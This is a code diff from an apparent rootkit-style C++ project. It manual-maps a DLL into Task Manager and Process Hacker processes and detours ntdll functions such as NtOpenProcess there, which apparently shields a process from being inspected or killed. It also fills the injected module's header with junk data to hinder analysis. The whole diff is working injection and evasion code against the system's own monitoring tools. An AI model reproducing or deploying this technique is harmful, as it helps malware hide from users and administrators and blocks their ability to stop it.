@@ -9,20 +9,19 @@ int main()
 	ntdll::initialise();
 
 	// READ LITTLEBRO FROM DISK FOR INJECTION
-	auto littlebro_buffer = binary_file::read_file("littlebro.dll");
+	//auto littlebro_buffer = binary_file::read_file("littlebro.dll");
+	auto littlebro_buffer = binary_file::read_file("D:\\Sync\\Programming\\C++\\Projects\\latebros\\x64\\Debug\\littlebro.dll");
 
 	// SETUP HOOK CONTAINER
 	// FORMAT: MODULE NAME, FUNCTION NAME, EXPORT NAME
 	hook_container container =
 	{
-		{ "kernel32.dll", "GetProcAddress", "gpa" },
-		{ "kernel32.dll", "TerminateProcess", "kterm" },
-		{ "kernel32.dll", "OpenProcess", "op" },
-		{ "kernel32.dll", "K32EnumProcesses", "enump" },
-		{ "ntdll.dll", "NtTerminateProcess", "ntterm" },
-		{ "ntdll.dll", "NtSuspendProcess", "ntsusp" },
+		// HOOK AS LOW AS POSSIBLE TO PREVENT CIRCUMVENTIONS
+		//{ "kernel32.dll", "K32EnumProcesses", "enump" },
+		//{ "ntdll.dll", "NtTerminateProcess", "ntterm" },
+		//{ "ntdll.dll", "NtSuspendProcess", "ntsusp" },
 		{ "ntdll.dll", "NtOpenProcess", "ntop" },
-		{ "ntdll.dll", "NtQuerySystemInformation", "qsi" }
+		//{ "ntdll.dll", "NtQuerySystemInformation", "qsi" }
 	};
 
 	for (const auto& process_name : { "taskmgr.exe", "ProcessHacker.exe" })
@@ -37,18 +36,13 @@ int main()
 		{
 			logger::log_formatted("Target Process", process_name);
 
-			auto proc = process(id, PROCESS_ALL_ACCESS);
-			auto injector = injection::manualmap(proc);
-
 			// MAP LITTLEBRO INTO TARGET PROCESS
-			auto littlebro = injector.inject(littlebro_buffer);
-
-			// HOOK REMOTE FUNCTIONS BY REPLACING THE RESPECTIVE IMPORT ADDRESS TABLE
-			// ENTRIES WITH OUR OWN PROTECTIVE HOOKS, EXPORTED BY LITTLEBRO
+			auto proc = process(id, PROCESS_ALL_ACCESS);
+			auto littlebro = injection::manualmap(proc).inject(littlebro_buffer);
 
 			// HOOK FUNCTIONS
 			for (const auto [module_name, function_name, export_name] : container)
-				proc.hook_function(module_name, function_name, proc.get_module_export(littlebro, export_name));
+				proc.detour_function(module_name, function_name, littlebro, export_name);
 
 			// FILL HEADER SECTION WITH PSEUDO-RANDOM DATA WITH HIGH ENTROPY
 			auto junk_buffer = std::vector<std::uint8_t>(0x1000);
